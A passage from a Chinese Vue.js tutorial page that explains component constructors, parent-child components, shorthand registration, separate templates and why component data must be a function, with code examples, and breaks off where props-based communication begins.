class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1.创建组件构造器</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> cpnC = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;h2&gt;我是标题&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;p&gt;我是内容,哈哈哈哈啊&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 2.注册组件(全局组件, 意味着可以在多个Vue的实例下面使用)</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// Vue.component(&#x27;cpn&#x27;, cpnC)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 局部组件</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// cpn表示使用组件时的标签名，cpnC表示组件构造器</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: cpnC</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app2 = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app2&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="父组件和子组件"><a href="#父组件和子组件" class="headerlink" title="父组件和子组件"></a>父组件和子组件</h1><p>在前面我们看到了组件树：组件和组件之间存在层级关系，而其中一种非常重要的关系就是父子组件的关系。<br>我们来看通过代码如何组成的这种层级关系：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--&lt;cpn1&gt;&lt;/cpn1&gt;使用不了，会报错，因为没有全局注册或在Vue实例中注册该组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  // 1.创建第一个组件构造器(子组件)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  const cpnC1 = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    template: `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是标题1<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容, 哈哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  // 2.创建第二个组件构造器(父组件)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  const cpnC2 = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    template: `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容, 呵呵呵呵<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    `,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    components: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      cpn1: cpnC1</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  // root组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  const app = new Vue(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    el: &#x27;#app&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    components: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      cpn2: cpnC2</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父子组件错误用法：以子标签的形式在Vue实例中使用</p><p>因为当子组件注册到父组件的components时，Vue会编译好父组件的模块，该模板的内容已经决定了父组件将要渲染的HTML（相当于父组件中已经有了子组件中的内容了）</p><p><code>&lt;child-cpn&gt;&lt;/child-cpn&gt;</code>是只能在父组件中被识别的。</p><p>类似这种用法，<code>&lt;child-cpn&gt;&lt;/child-cpn&gt;</code>是会被浏览器忽略的。</p><h1 id="注册组件语法糖"><a href="#注册组件语法糖" class="headerlink" title="注册组件语法糖"></a>注册组件语法糖</h1><p>在上面注册组件的方式，可能会有些繁琐。Vue为了简化这个过程，提供了注册的语法糖。</p><p>主要是省去了调用Vue.extend()的步骤，而是可以直接使用一个对象来代替。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 创建组件构造器</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// const cpn1 = Vue.extend()</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1.全局组件注册的语法糖</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn1&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;h2&gt;我是标题1&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;p&gt;我是内容, 哈哈哈哈&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 2.注册局部组件的语法糖</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;cpn2&#x27;</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          &lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            &lt;h2&gt;我是标题2&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            &lt;p&gt;我是内容, 呵呵呵&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="模板的分离写法"><a href="#模板的分离写法" class="headerlink" title="模板的分离写法"></a>模板的分离写法</h1><p>刚才我们通过语法糖简化了Vue组件的注册过程，另外还有一个地方的写法比较麻烦，就是template模块写法。</p><p>如果我们能将其中的HTML分离出来写，然后挂载到对应的组件上，必然结构会变得非常清晰。</p><p>Vue提供了两种方案来定义HTML模块内容：</p><ul><li>使用<code>&lt;script&gt;</code>标签</li><li>使用<code>&lt;template&gt;</code>标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.script标签, 注意:类型必须是text/x-template--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-template&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cpn1&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容,哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--2.template标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容,呵呵呵<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn1&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&quot;#cpn1&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn2&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&quot;#cpn2&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="组件的数据存放"><a href="#组件的数据存放" class="headerlink" title="组件的数据存放"></a>组件的数据存放</h1><p>组件去访问message，message定义在Vue的data中，我们发现最终并没有显示结果。所以<strong>组件是不能【直接】访问Vue实例中的data数据</strong>。</p><p>组件是一个单独功能模块的封装：这个模块有属于自己的HTML模板，也应该有属于自己的数据data，只是这个data属性<strong>必须是一个函数</strong>，而且这个函数返回一个对象，对象内部保存着数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容,呵呵呵<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">title</span>: <span class="string">&#x27;abc&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// title: &#x27;我是标题&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>为什么data在组件中必须是一个函数呢?</p><ul><li>如果不是一个函数，Vue直接就会报错。</li><li>其次，原因是在于Vue让每个组件对象都返回一个<strong>新的对象</strong>，因为如果是同一个对象的话，组件在多次使用时会相互影响。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--组件实例对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前计数: &#123;&#123;counter&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;decrement&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1.注册组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> obj = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">counter</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// data() &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//   return &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     counter: 0</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//   &#125;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;,</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> obj</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">counter</span>++</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">decrement</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">counter</span>--</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里因为data返回同一个对象，所以在操作一个计数器的加减时，会影响到其他计数器的显示结果。</p><h1 id="父子组件的通信"><a href="#父子组件的通信" class="headerlink" title="父子组件的通信"></a>父子组件的通信</h1><p>在上面我们提到子组件是不能直接引用父组件或者Vue实例的数据的。</p><p>但是在开发中，往往有一些数据确实需要从上层传递到下层：</p><blockquote><p>比如在一个页面中，我们从服务器请求到了很多的数据，其中一部分数据，并非是我们整个页面的大组件来展示的，而是需要下面的子组件进行展示。这个时候，并不会让子组件再次发送一个网络请求，而是直接让大组件(父组件)将数据传递给小组件(子组件)。</p></blockquote><p>如何进行父子组件间的通信呢？</p><ul><li><p>父组件通过props向子组件传递数据</p></li><li><p>子组件通过事件向父组件发送消息</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" 